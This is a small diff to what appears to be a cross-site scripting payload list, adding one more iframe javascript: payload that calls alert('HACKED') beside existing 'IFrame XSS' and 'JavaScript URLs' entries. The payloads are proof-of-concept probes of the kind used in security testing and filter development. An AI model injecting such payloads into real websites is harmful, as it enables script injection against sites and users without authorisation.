@@ -31,6 +31,7 @@
 # IFrame XSS
 <iframe src=javascript:alert('XSS')>
 <iframe src="javascript:alert('XSS')">
+<iframe src="javascript:alert('HACKED')">
 
 # JavaScript URLs
 javascript:alert('XSS')
